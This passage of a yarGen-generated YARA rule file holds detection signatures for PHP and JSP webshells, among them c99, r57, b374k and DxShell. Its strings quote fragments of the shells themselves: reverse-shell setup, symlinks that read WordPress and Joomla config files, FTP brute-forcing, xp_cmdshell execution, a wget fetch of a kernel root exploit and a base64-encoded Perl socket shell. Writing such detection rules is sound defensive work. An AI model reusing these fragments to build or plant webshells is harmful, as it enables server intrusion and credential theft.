      $x3 = "$DxDOWNLOAD_File['content'].=\"\\n\\t\".'==== MySQL Dump '.DxDate(time()).' - DxShell v'.$GLOB['SHELL']['Ver'].' by o_O Tync';" fullword ascii
      $s4 = "<html><head><title><?=$_SERVER['HTTP_HOST'];?> --= DxShell 1.0 - by o_O Tync =-- :: <?=$GLOB['DxMODES'][$_GET['dxmode']];?></tit" ascii
      $s5 = "print \"\\n\".'<?php'.\"\\n\".' //Execute this, and you\\'ll get the requested \"'.$DxDOWNLOAD_File['filename'].'\" in the same " ascii
      $s6 = "<html><head><title><?=$_SERVER['HTTP_HOST'];?> --= DxShell 1.0 - by o_O Tync =-- :: <?=$GLOB['DxMODES'][$_GET['dxmode']];?></tit" ascii
      $s7 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.DxURL('kill', '').'&dxmode=F_DWN&dxparam=SRC&dxfil" ascii
      $s8 = "$DxDOWNLOAD_File['filename']='Dump_'.$_GET['dxsql_s'].'_'.$_GET['dxsql_d'].'.sql';" fullword ascii
      $s9 = "print \"\\n\".'<?php'.\"\\n\".' //Execute this, and you\\'ll get the requested \"'.$DxDOWNLOAD_File['filename'].'\" in the same " ascii
      $s10 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87" ascii
      $s11 = "if (headers_sent()) $DXGLOBALSHIT=true; else $DXGLOBALSHIT=FALSE; /* This means if bug.php has fucked up the output and headers " ascii
      $s12 = "((@$_POST['DxS_Auth']['L']==$GLOB['SHELL']['USER']['Login']) AND /* form */" fullword ascii
      $s13 = "print '[!] For complete portlist go to <a href=\"http://www.iana.org/assignments/port-numbers\" target=_blank>http://www.iana.or" ascii
      $s14 = "print '[!] For complete portlist go to <a href=\"http://www.iana.org/assignments/port-numbers\" target=_blank>http://www.iana.or" ascii
      $s15 = "function DxExecNahuj($cmd, &$OUT, &$RET) /* returns the name of function that exists, or FALSE */" fullword ascii
      $s16 = "if (!isset($F['s_php'])) die('o_O Tync DDOS Remote Shell '.$GLOB['SHELL']['Ver'].\"\\n\".'<br>Use GET or POST to set \"s_php\" v" ascii
      $s17 = "$DEFQUERY=DxHTTPMakeHeaders('GET', '/index.php?get=q&get2=d', 'www.microsoft.com', 'DxS Browser', 'http://referer.com/', array('" ascii
      $s18 = "Message Processing Module [recv]',46=>'MPM [default send]',47=>'NI FTP',48=>'Digital Audit Daemon',49=>'TACACS, Login Host Proto" ascii
      $s19 = "host'])?$_POST['dxsock_host']:'www.microsoft.com') ).'\" style=\"width:100%;\">';" fullword ascii
      $s20 = "print \"\\n\\t\".'<input type=text name=\"DxFTP_FTP\" value=\"ftp.host.com[:21]\" style=\"width:100%;\">';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_1n73ction {
   meta:
      description = "webshell - file 1n73ction.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
   strings:
      $x1 = "$s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = \"443\";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = \"<br><b" ascii
      $x2 = "$link =\"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$comxx&filter_exploit_text=&filter_aut" ascii
      $s3 = "$link =\"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$comxx&filter_exploit_text=&filter_aut" ascii
      $s4 = "<html><head><link rel=\"SHORTCUT ICON\" href=\"http://png-3.findicons.com/files/icons/1935/red_gems_vol_2/128/r2_dragon.png\"><t" ascii
      $s5 = "document.location = 'http://www.pharmconseil-elearning.com/main/upload/Sql_injection_dengan_hackbar.pdf';" fullword ascii
      $s6 = "if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/s" ascii
      $s7 = "echo \"<b>Success : skarang password barunya >>> - (123456)\";" fullword ascii
      $s8 = "$BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman." ascii
      $s9 = "if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/s" ascii
      $s10 = "$BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman." ascii
      $s11 = "  $x=@file_get_contents('http://www.bing.com/search?q=ip%3A' . $ip . '+index.php?option=com&first=' . $npage);" fullword ascii
      $s12 = "document.location = 'http://www.pharmconseil-elearning.com/main/upload/by_passing_illegal_mix_of_collations_for_operation__union" ascii
      $s13 = "document.location = 'http://www.pharmconseil-elearning.com/main/upload/by_passing_illegal_mix_of_collations_for_operation__union" ascii
      $s14 = "a3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNS" ascii /* base64 encoded string 'kperl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCiRTaGVsbAk9ICIvYmluL2Jhc2giOw0KJEFSR0M9QEFSR' */
      $s15 = "symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $s16 = "symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $s17 = "symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $s18 = "symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $s19 = "echo \"<center/><br/><b><font color=#00ff00>-=[ Command  Bypass Exploit ]=-</font></b><br>" fullword ascii
      $s20 = "symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule b374k_2_2 {
   meta:
      description = "webshell - file b374k-2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad"
   strings:
      $s1 = "else echo \"- shell command -\";" fullword ascii
      $s2 = "if(buff.value == '- shell command -') buff.value = '';" fullword ascii
      $s3 = "Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2" ascii
      $s4 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
      $s5 = "setcookie(\"b374k\",$login,time() - $s_login_time);" fullword ascii
      $s6 = "elseif(isset($_REQUEST['pgsqlcon']) && ($con = pg_connect(\"host=$sqlhost user=$sqluser password=$sqlpass port=$sqlport\"))){" fullword ascii
      $s7 = "$rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s8 = "// shell command" fullword ascii
      $s9 = "else $s_auth = true; // $s_pass variable (password) is empty , go ahead, no login page" fullword ascii
      $s10 = "$s_pass = \"\"; // shell password, fill with password in md5 format to protect shell" fullword ascii
      $s11 = "} // bind and reverse shell" fullword ascii
      $s12 = "// bind and reverse shell" fullword ascii
      $s13 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</td><td style=\\\"text-align:center;\\\">\".$owner" ascii
      $s14 = "$s_login_time = 3600 * 24 * 7;" fullword ascii
      $s15 = "setcookie(\"b374k\",md5($login),time() + $s_login_time);" fullword ascii
      $s16 = "$buff .= \"<tr><td><a href=\\\"?d=\".$parent.\"\\\">[ $folder ]</a></td><td>LINK</td><td style=\\\"text-align:center;\\\">\".$ow" ascii
      $s17 = "// http://www.kryogenix.org/code/browser/sorttable/ - this makes the tables sortable" fullword ascii
      $s18 = "elseif(isset($_REQUEST['oraclecon']) && ($con = oci_connect($sqluser,$sqlpass,$hostandport))){" fullword ascii
      $s19 = "if(oci_execute($st)){" fullword ascii
      $s20 = "elseif(isset($_REQUEST['mssqlcon']) && ($con = mssql_connect($hostandport,$sqluser,$sqlpass))){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_x {
   meta:
      description = "webshell - file x.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "91de9ba378e4bd757dad532d7c5a0b59c2404d29d7c20332bc167e3134bc64db"
   strings:
      $x1 = "\"welcome to pwnshell! - <a target='_new' href='http://i8jesus.com/stuff/pwnshell/'>http://i8jesus.com/stuff/pwnshell</a><br/>\"" ascii
      $x2 = "\"welcome to pwnshell! - <a target='_new' href='http://i8jesus.com/stuff/pwnshell/'>http://i8jesus.com/stuff/pwnshell</a><br/>\"" ascii
      $x3 = "\"\",d]);this._datepickerShowing=false;this._lastInput=null;if(this._inDialog){this._dialogInput.css({position:\"absolute\",left" ascii
      $x4 = "false;C.onload=C.onreadystatechange=function(){if(!B&&(!this.readyState||this.readyState===\"loaded\"||this.readyState===\"compl" ascii
      $x5 = "false&&n===\"GET\"){var r=J(),u=e.url.replace(wb,\"$1_=\"+r+\"$2\");e.url=u+(u===e.url?(ka.test(e.url)?\"&\":\"?\")+\"_=\"+r:\"" ascii
      $x6 = "global:true,type:\"GET\",contentType:\"application/x-www-form-urlencoded\",processData:true,async:true,xhr:A.XMLHttpRequest&&(A." ascii
      $s7 = "global:true,type:\"GET\",contentType:\"application/x-www-form-urlencoded\",processData:true,async:true,xhr:A.XMLHttpRequest&&(A." ascii
      $s8 = "Process p = Runtime.getRuntime().exec(" fullword ascii
      $s9 = "c.preventDefault()}if(a){b(c.target).attr(\"tabIndex\",-1);b(a).attr(\"tabIndex\",0);a.focus();return false}return true}},resize" ascii
      $s10 = "var h=String.fromCharCode(a.charCode==c?a.keyCode:a.charCode);return a.ctrlKey||h<\" \"||!d||d.indexOf(h)>-1}},_doKeyUp:function" ascii
      $s11 = "u=j?this:c(this.context);if(c.isFunction(f)){e=f;f=w}for(d=(d||\"\").split(\" \");(i=d[o++])!=null;){j=O.exec(i);k=\"\";if(j){k=" ascii
      $s12 = "<% /* pwnshell.jsp - www.i0day.com */ %>" fullword ascii
      $s13 = "(y=b(\"base\")[0])&&w===y.href)){v=u.hash;u.href=v}if(n.test(v))i.panels=i.panels.add(i._sanitizeSelector(v));else if(v&&v!==\"#" ascii
      $s14 = "-1).css(\"outline\",0).keydown(function(q){if(a.closeOnEscape&&q.keyCode&&q.keyCode===b.ui.keyCode.ESCAPE){e.close(q);q.preventD" ascii
      $s15 = "b.datepicker._pos[1]+=a.offsetHeight}var i=false;b(a).parents().each(function(){i|=b(this).css(\"position\")==\"fixed\";return!i" ascii
      $s16 = "a<0&&b(this).css(\"top\",e.top-a)}},resizable:true,show:null,stack:true,title:\"\",width:300,zIndex:1E3},_create:function(){this" ascii
      $s17 = "\"body\",f)[0]).mousedown(function(e){var a=c.menu.element[0];b(e.target).closest(\".ui-menu-item\").length||setTimeout(function" ascii
      $s18 = "e[n](g)}else{if(h.collapsible&&e)c.toggle();else{f.hide();c.show()}i(true)}f.prev().attr({\"aria-expanded\":\"false\",tabIndex:-" ascii
      $s19 = "/(msie) ([\\w.]+)/.exec(a)||!/compatible/.test(a)&&/(mozilla)(?:.*? rv:([\\w.]+))?/.exec(a)||[];return{browser:a[1]||\"\",versio" ascii
      $s20 = "load:function(d){d=this._getIndex(d);var h=this,i=this.options,j=this.anchors.eq(d)[0],n=b.data(j,\"load.tabs\");this.abort();if" ascii
   condition:
      uint16(0) == 0x253c and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule webshell_nc {
   meta:
      description = "webshell - file webshell-nc.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
   strings:
      $x1 = "Process p = Runtime.getRuntime().exec(strCommand, null," fullword ascii
      $s2 = "<div id=\"menu4\" class=\"tabcontent\"><!-- linux nc shell -->" fullword ascii
      $s3 = "<a href=\"http://www.kukafei520.net/blog\" target=\"_blank\">http://www.kukkafei520.net/blog</a>" fullword ascii
      $s4 = "+ \"<form name=login method=post>" fullword ascii
      $s5 = "+ \"<form name=login method=post>username:<input name=LName type=text size=15><br>\"" fullword ascii
      $s6 = "Hashtable ht = parser.processData(request.getInputStream()," fullword ascii
      $s7 = "public Hashtable processData(ServletInputStream is, String boundary," fullword ascii
      $s8 = "pw.println(\"print \\\"voilet shell\\nblog:www.kukafei520.net.\\\\n\\\";\");" fullword ascii
      $s9 = "\" + props.getProperty(\"java.io.tmpdir\")" fullword ascii
      $s10 = "\" + props.getProperty(\"user.dir\") + \"<br>\");" fullword ascii
      $s11 = "+ \"password:<input name=LPass type=password size=15><br><input type=submit value=Login></form></center>\");" fullword ascii
      $s12 = "\", \"Execute\"};" fullword ascii
      $s13 = " voilet119@163.com" fullword ascii
      $s14 = "System.out.println(isLogout);" fullword ascii
      $s15 = ":voilet119@163.com" fullword ascii
      $s16 = "value=\"<%=strExecute[languageNo]%>\">" fullword ascii
      $s17 = "String[] strExecute = {\"" fullword ascii
      $s18 = "//System.out.println(strCommand);" fullword ascii
      $s19 = "response.setHeader(\"Content-Disposition\"," fullword ascii
      $s20 = "strCommand[0] = strShell[0];" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_400 {
   meta:
      description = "webshell - file 400.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
   strings:
      $s1 = "Process p = Runtime.getRuntime().exec(" fullword ascii
      $s2 = "<a href=\"http://www.whylover.com\" target=\"_blank\">www.hmilyld.cn</a> By Hmilyld" fullword ascii
      $s3 = "Hmilyld:<a href=\"http://www.hmilyld.cn\" target=\"_blank\">http://www.hmilyld.cn</a> <a href=\"http://www.whylover.com\" target" ascii
      $s4 = "Hmilyld:<a href=\"http://www.hmilyld.cn\" target=\"_blank\">http://www.hmilyld.cn</a> <a href=\"http://www.whylover.com\" target" ascii
      $s5 = "Hashtable ht = parser.processData(request.getInputStream()," fullword ascii
      $s6 = "public Hashtable processData(ServletInputStream is, String boundary," fullword ascii
      $s7 = "\"cmd /c \" + strCmd);" fullword ascii
      $s8 = "String[] strExecute = { \"" fullword ascii
      $s9 = "\", \"Execute\" };" fullword ascii
      $s10 = "response.setHeader(\"Content-Disposition\"," fullword ascii
      $s11 = "out.println(\"<li>Total Memory:\" + total + \"</li>\");" fullword ascii
      $s12 = "response.setHeader(\"content-type\"," fullword ascii
      $s13 = "onClick=\"return expandcontent('menu2', this)\"><%=strCommand[languageNo]%></a>" fullword ascii
      $s14 = "if (request.getParameter(\"password\") != null" fullword ascii
      $s15 = "<a href=\"http://www.whylover.com\"" fullword ascii
      $s16 = "&& request.getParameter(\"password\").equals(password)) {" fullword ascii
      $s17 = "out.println(\"<li>Start Memory:\" + startMem + \"</li>\");" fullword ascii
      $s18 = "out.println(\"<li>End Memory:\" + endMem + \"</li>\");" fullword ascii
      $s19 = "nk\">http://www.whylover.com</a></li>" fullword ascii
      $s20 = "sbFolder.append(\"','\"+formatPath(strDir)+\"\\\\\\\\hZipFile.zip','\" + strCmd + \"','1','');\\\">\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      8 of them
}

rule r57_Mohajer22 {
   meta:
      description = "webshell - file r57_Mohajer22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x2 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x3 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $x4 = "  if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii
      $s5 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $s6 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s8 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s9 = "'eng_text1' =>'Executed command'," fullword ascii
      $s10 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s11 = "'eng_text2' =>'Execute command on server'," fullword ascii
      $s12 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $s13 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
      $s14 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s15 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_query\")&&($_POST['cmd']!=\"ftp_bru" ascii
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii
      $s17 = "  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s18 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii
      $s19 = "echo sr(15,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?" ascii
      $s20 = " else if(!$users=get_users()) { echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><fo" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_ctt_sh {
   meta:
      description = "webshell - file ctt_sh.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
   strings:
      $x1 = " ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?p" ascii
      $x2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $s3 = "  if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $s4 = "  echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login" ascii
      $s5 = "  echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login" ascii
      $s6 = "  if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$sul.\"act=f&f=acco" ascii
      $s7 = "  if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$sul.\"act=f&f=acco" ascii
      $s8 = "  function ctftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $s9 = "CTT Shell -=[ <? echo $HTTP_HOST; ?> ]=- </title>" fullword ascii
      $s10 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s13 = "rver).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password -" ascii
      $s14 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii
      $s15 = "echo \"<form action=\\\"\".$sul.\"act=cmd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"\".htmls" ascii
      $s16 = " $out = \"# Dumped by ctShell.SQL v. \".$cv.\"" fullword ascii
      $s17 = "nput type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Execute\\\">&nbsp;<input type=\\\"submit\\\" value=\\\"View&Edit command" ascii
      $s18 = "  else {echo \"<form method=\\\"POST\\\"><br>Read first: <input type=\\\"text\\\" name=\\\"fqb_lenght\\\" value=\\\"\".$nixpwdpe" ascii
      $s19 = "  else {$file = \"/tmp/dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $s20 = ":</b><form action=\"<?php echo $sul; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_ac" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule c99_w4cking {
   meta:
      description = "webshell - file c99_w4cking.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
   strings:
      $x1 = "                    <OPTION VALUE=\"wget http://www.synsta.templatez.org/1.txt\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Explo" ascii
      $x2 = "                    <OPTION VALUE=\"wget http://www.synsta.templatez.org/1.txt\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Explo" ascii
      $x3 = "      <form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_" ascii
      $x4 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $s5 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $s6 = "$r11  = $_SERVER['SERVER_ADDR'];$i94 = $_SERVER['REMOTE_ADDR'];$i71= gethostbyaddr($i94);$h42 = $_SERVER['HTTP_HOST'];$a83 = $_S" ascii
      $s7 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s8 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s9 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $s10 = "     echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" na" ascii
      $s11 = "  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $s12 = "                     <OPTION VALUE=\"./vanish <? echo exec('whoami'); ?> <? echo $_SERVER[\"REMOTE_ADDR\"]; ?> <? echo gethostby" ascii
      $s13 = "echo \"<b>Your ip: <a href=http://\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Server ip: <a href=http:" ascii
      $s14 = "  echo \"Result Of Locally Executed Command: <b>$execcmd</b></br>\";" fullword ascii
      $s15 = "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"<?php echo $surl; ?>\"><input type=hidden name=act val" ascii
      $s16 = "rver).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password -" ascii
      $s17 = "\\\"dump\\\"><input type=\\\"hidden\\\" name=\\\"sql_db\\\" value=\\\"\".htmlspecialchars($sql_db).\"\\\"><input type=\\\"hidden" ascii
      $s18 = " echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>" ascii
      $s19 = "echo \"dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; ?>\">&nbsp;<input type=\"submit\" nam" ascii
      $s20 = "                   <OPTION VALUE=\"mv 1.txt exploit.c\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 2)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule Shell__ci___Biz_was_here {
   meta:
      description = "webshell - file Shell [ci] .Biz was here.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
   strings:
      $x1 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x2 = "t=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - Shellci.biz</title><STYLE>" fullword ascii
      $x3 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" " ascii
      $x4 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii
      $x5 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgCol" ascii
      $x6 = "le.com/releases/ckira\\\">kira</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x7 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $x8 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $x9 = "</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwid" ascii
      $s10 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $s11 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s12 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s13 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $s14 = "     echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" na" ascii
      $s15 = "  function k1r4ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $s16 = "e=\"text\" name=\"dump_file\" size=\"30\" value=\"<?php echo \"dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-" ascii
      $s17 = "rver).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password -" ascii
      $s18 = "\\\"dump\\\"><input type=\\\"hidden\\\" name=\\\"sql_db\\\" value=\\\"\".htmlspecialchars($sql_db).\"\\\"><input type=\\\"hidden" ascii
      $s19 = " echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>" ascii
